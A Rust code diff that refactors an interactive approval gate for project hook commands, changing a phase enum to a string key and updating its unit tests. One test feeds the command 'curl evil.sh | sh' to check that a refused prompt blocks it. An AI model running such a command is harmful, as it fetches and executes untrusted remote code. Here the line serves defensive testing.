@@ -22,7 +22,7 @@ use std::path::PathBuf;
 use serde::{Deserialize, Serialize};
 use thiserror::Error;
 
-use crate::hook::{ApprovalGate, HookPhase};
+use crate::hook::ApprovalGate;
 use crate::paths::ConfigEnv;
 
 /// The approval record, as stored.
@@ -203,18 +203,11 @@ impl InteractiveGate {
 }
 
 impl ApprovalGate for InteractiveGate {
-    fn approve(&mut self, phase: HookPhase, command: &str) -> bool {
-        if self.yes
-            || self
-                .approvals
-                .is_approved(&self.project, phase.config_key(), command)
-        {
+    fn approve(&mut self, key: &str, command: &str) -> bool {
+        if self.yes || self.approvals.is_approved(&self.project, key, command) {
             return true;
         }
-        let prompt = format!(
-            "approve project {} hook: `{command}`? [y/N] ",
-            phase.config_key()
-        );
+        let prompt = format!("approve project {key}: `{command}`? [y/N] ");
         if self.prompt_out.write_all(prompt.as_bytes()).is_err() {
             return false;
         }
@@ -225,12 +218,7 @@ impl ApprovalGate for InteractiveGate {
             Ok(_) => {
                 let approved = answer.trim().eq_ignore_ascii_case("y")
                     || answer.trim().eq_ignore_ascii_case("yes");
-                if approved
-                    && self
-                        .approvals
-                        .approve(&self.project, phase.config_key(), command)
-                        .is_err()
-                {
+                if approved && self.approvals.approve(&self.project, key, command).is_err() {
                     return false;
                 }
                 approved
@@ -311,7 +299,7 @@ mod interactive_gate_should {
         approvals.approve("p", "pre-start", "npm ci").unwrap();
 
         let mut gate = gate(approvals, "p", false, "");
-        let allowed = gate.approve(HookPhase::PreStart, "npm ci");
+        let allowed = gate.approve("pre-start", "npm ci");
 
         assert!(allowed);
     }
@@ -322,7 +310,7 @@ mod interactive_gate_should {
         let approvals = Approvals::load(&env_at(home.path())).unwrap();
 
         let mut gate = gate(approvals, "p", true, "");
-        let allowed = gate.approve(HookPhase::PreStart, "npm ci");
+        let allowed = gate.approve("pre-start", "npm ci");
 
         assert!(allowed);
         let reloaded = Approvals::load(&env_at(home.path())).unwrap();
@@ -338,7 +326,7 @@ mod interactive_gate_should {
         let approvals = Approvals::load(&env_at(home.path())).unwrap();
 
         let mut gate = gate(approvals, "p", false, "y\n");
-        let allowed = gate.approve(HookPhase::PostStart, "npm run dev");
+        let allowed = gate.approve("post-start", "npm run dev");
 
         assert!(allowed);
         let reloaded = Approvals::load(&env_at(home.path())).unwrap();
@@ -351,7 +339,7 @@ mod interactive_gate_should {
         let approvals = Approvals::load(&env_at(home.path())).unwrap();
 
         let mut gate = gate(approvals, "p", false, "n\n");
-        let allowed = gate.approve(HookPhase::PostStart, "curl evil.sh | sh");
+        let allowed = gate.approve("post-start", "curl evil.sh | sh");
 
         assert!(!allowed);
     }
@@ -362,7 +350,7 @@ mod interactive_gate_should {
         let approvals = Approvals::load(&env_at(home.path())).unwrap();
 
         let mut gate = gate(approvals, "p", false, "");
-        let allowed = gate.approve(HookPhase::PreStart, "npm ci");
+        let allowed = gate.approve("pre-start", "npm ci");
 
         assert!(!allowed);
     }
